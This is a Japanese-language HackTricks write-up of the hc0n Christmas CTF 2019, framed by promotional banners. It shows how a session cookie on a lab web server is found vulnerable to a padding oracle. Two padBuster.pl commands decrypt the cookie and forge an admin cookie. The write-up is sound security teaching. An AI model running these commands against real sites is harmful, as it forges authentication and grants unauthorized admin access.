# hc0n クリスマス CTF - 2019

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricks で会社を宣伝**してみたいですか？または、**PEASS の最新バージョンにアクセスしたり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけてください
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discord グループ**に**参加**するか、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** をフォロー**してください。
* **ハッキングトリックを共有するために、[hacktricks リポジトリ](https://github.com/carlospolop/hacktricks) と [hacktricks-cloud リポジトリ](https://github.com/carlospolop/hacktricks-cloud)** に PR を提出してください。

</details>

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## 列挙

私は**ツール Legion**を使用してマシンを列挙し始めました：

![](<../../.gitbook/assets/image (244).png>)

2 つのポートが開いています: 80 (**HTTP**) と 22 (**SSH**)

Web ページでは**新しいユーザーを登録**することができ、**クッキーの長さが指定されたユーザー名の長さに依存**することに気づきました：

![](<../../.gitbook/assets/image (245).png>)

![](<../../.gitbook/assets/image (246).png>)

そして、**クッキーの**いくつかの**バイト**を変更すると、このエラーが表示されます：

![](<../../.gitbook/assets/image (247).png>)

この情報と[**パディングオラクル脆弱性の読み取り**](../../cryptography/padding-oracle-priv.md)により、それを悪用することができました：
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```
![](<../../.gitbook/assets/image (248).png>)

![](<../../.gitbook/assets/image (249) (1).png>)

**ユーザーadminを設定します:**
```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```
![](<../../.gitbook/assets/image (250).png>)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセス**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。

</details>
